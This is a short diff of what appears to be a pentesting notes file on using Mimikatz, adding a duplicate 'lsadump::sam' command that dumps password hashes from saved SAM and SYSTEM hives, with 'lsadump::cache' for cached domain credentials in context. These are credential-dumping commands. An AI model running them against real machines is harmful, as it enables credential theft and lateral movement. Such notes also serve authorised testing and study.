@@ -22,6 +22,7 @@ USE MIMIKATZ TO EXTRACT HASHES
 ==
 
 mimikatz # lsadump::sam /sam:sam.dump /system:system.dump
+mimikatz lsadump::sam /sam:sam.dump /system:system.dump
 
 Domain : MACHINENAME
 SysKey : KEY
@@ -58,4 +59,3 @@ RUN MIMIKATZ
 .\mimikatz\mimikatz\Win32>mimikatz.exe
 
 lsadump::cache
-
